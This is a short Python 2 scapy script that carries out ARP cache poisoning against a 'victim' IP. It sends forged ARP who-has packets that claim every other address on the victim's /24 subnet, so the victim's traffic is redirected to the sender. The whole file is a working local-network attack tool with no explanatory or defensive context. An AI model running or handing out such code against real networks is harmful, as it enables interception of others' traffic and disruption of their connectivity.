#!/usr/bin/python
import scapy,sys

if not len(sys.argv) == 2:
	print "Must supply IP"
	sys.exit(1)

victim = sys.argv[1]
network = victim[:victim.rfind(".")+1] + "%d"

tmac = scapy.getmacbyip(victim)

for i in range(255):
	target = str(network % i)
	
	if target == victim:
		continue

	p = scapy.Ether(dst=tmac)/scapy.ARP(op="who-has", psrc=target, pdst=victim)

	scapy.sendp(p, iface_hint=target)